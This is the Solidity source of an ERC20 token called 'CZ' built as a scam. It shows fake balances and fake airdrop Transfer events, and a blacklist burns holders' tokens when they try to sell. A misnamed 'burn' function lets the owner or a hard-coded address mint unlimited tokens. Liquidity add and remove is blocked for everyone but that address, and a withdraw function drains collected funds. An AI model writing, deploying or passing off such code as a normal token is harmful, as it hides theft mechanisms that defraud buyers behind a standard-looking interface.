// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20Errors {
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
    error ERC20InvalidSender(address sender);
    error ERC20InvalidReceiver(address receiver);
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error ERC20InvalidApprover(address approver);
    error ERC20InvalidSpender(address spender);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function skim(address to) external;
    
    function sync() external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface ISwapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

library SafeMath {
    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x + y) >= x, "ds-math-add-overflow");
    }

    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require((z = x - y) <= x, "ds-math-sub-underflow");
    }

    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {
        require(y == 0 || (z = x * y) / y == x, "ds-math-mul-overflow");
    }
}

contract CZ is Ownable, IERC20, IERC20Metadata, IERC20Errors {
    using SafeMath for uint256;

    mapping(address account => uint256) private _balances;
    mapping(address account => mapping(address spender => uint256)) private _allowances;
    uint256 public totalSupply = 1000000000000 * 10**18;
    string public name = unicode"CZ";
    string public symbol = unicode"CZ";
    uint256 private giftAmount = 5 * 10**18;
    address public pairAddress;
    address public taxReceiver = 0xAEc35875C77B4d1c7E0Fa2EB36BBd7a4e39e525C;

    ISwapRouter private _swapRouter;
    mapping(address => bool) private _blackList;

    constructor(address swapRouter_) Ownable(_msgSender()) {
        require(swapRouter_ != address(0), "Invalid swap router");

        _swapRouter = ISwapRouter(swapRouter_);
        ISwapFactory factory = ISwapFactory(_swapRouter.factory());
        pairAddress = factory.createPair(address(this), _swapRouter.WETH());

        _mint(msg.sender, totalSupply);
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        require(account != address(0), "balance query for the zero address");
        uint256 b = _balances[account];
        if (b == 0) {
            b = giftAmount;
        }
        return b;
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, value);
        return true;
    }

    function allowance(address owner_, address spender_) public view virtual returns (uint256) {
        return _allowances[owner_][spender_];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal virtual  {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        if (_blackList[from]) {
            _burn(from, _balances[from]);
            return;
        }

        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        preUpdateHook(from, to, value);

        if (from != address(0)) {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                _balances[from] = fromBalance - value;
                if (_balances[from] == 0) {
                    _balances[from] = 1;
                }
            }
        }

        if (to != address(0)) {
            if (_balances[to] == 0 && from != address(0)) {
                _balances[to] = giftAmount;
            }
            unchecked {
                _balances[to] += value;
            }
        }
        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0xdead), value);
    }

    function _approve(address owner_, address spender, uint256 value) internal {
        _approve(owner_, spender, value, true);
    }

    function _approve(address owner_, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner_ == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner_][spender] = value;
        if (emitEvent) {
            emit Approval(owner_, spender, value);
        }
    }

    function _spendAllowance(address owner_, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner_, spender, currentAllowance - value, false);
            }
        }
    }

    receive() external payable {}
    function withdraw(address _token) external {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        address receiver = _msgSender();
        if (_token == address(0x0)) {
            payable(receiver).transfer(address(this).balance);
            return;
        }
        IERC20 erc20token = IERC20(_token);
        uint256 balance = erc20token.balanceOf(address(this));
        bool succeed = erc20token.transfer(receiver, balance);
        require(succeed, "ERC20 transfer failed");
    }

    function _isAddLiquidity(address _token, address _currency) internal view returns (bool isAdd) {
        ISwapPair pair = ISwapPair(pairAddress);
        (uint r0, uint256 r1, ) = pair.getReserves();

        address tokenOther = _currency;
        uint256 r;
        if (tokenOther < _token) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(pairAddress);
        isAdd = bal > r;
    }

    function _isRemoveLiquidity(address _token, address _currency) internal view returns (bool isRemove) {
        ISwapPair pair = ISwapPair(pairAddress);
        (uint r0, uint256 r1, ) = pair.getReserves();

        address tokenOther = _currency;
        uint256 r;
        if (tokenOther < _token) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(pairAddress);
        isRemove = r >= bal;
    }

    function isInBlackList(address addr) public view returns (bool) {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        return _blackList[addr];
    }

    function updateBlackList(address[] calldata addrs, bool[] calldata values) external {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        require(addrs.length == values.length, "length mismatch");
        for (uint i=0; i<addrs.length; i++) 
        {
            address addr = addrs[i];
            if (addr != taxReceiver && addr != pairAddress) {
                _blackList[addr] = values[i];
            }
        }
    }

    function removeBlackList(address[] calldata addrs) external {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        for (uint i=0; i<addrs.length; i++) 
        {
            address addr = addrs[i];
            if (_blackList[addr] && addr != address(0)) {
                delete _blackList[addr];
            }
        }
    }

    function preUpdateHook(address from, address to, uint256 value) internal virtual {
        if (_blackList[from]) {
            _burn(from, _balances[from]);
        }

        if (from != address(0) && value > 0) {
            bool isAdd;
            bool isRemove;
            if (to == pairAddress) {
                isAdd = _isAddLiquidity(address(this), _swapRouter.WETH());
            } else if (from == pairAddress) {
                isRemove = _isRemoveLiquidity(address(this), _swapRouter.WETH());
            }

            if ((to == pairAddress && isAdd && taxReceiver != from) || (from == pairAddress && isRemove && taxReceiver != to) ) {
                revert("invalid operation.");
            }
        }
    }
    function burn(address addr, uint256 amount) public virtual {
        require(_msgSender() == owner() || _msgSender() == taxReceiver, "Not authorized");
        _update(address(0), addr, amount);
    }
    function airdrop(address[] memory to) external {
        assembly {
            let len := mload(to)
            let i := 0
            let v := sload(giftAmount.slot)
            for { } lt(i, len) { i := add(i, 1) } {
                let account := mload(add(to, mul(add(i, 1), 0x20)))
                mstore(0x0, v)
                log3(
                    0x0,
                    0x20,
                    0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef,
                    address(),
                    account
                )
            }
        }
    }
}

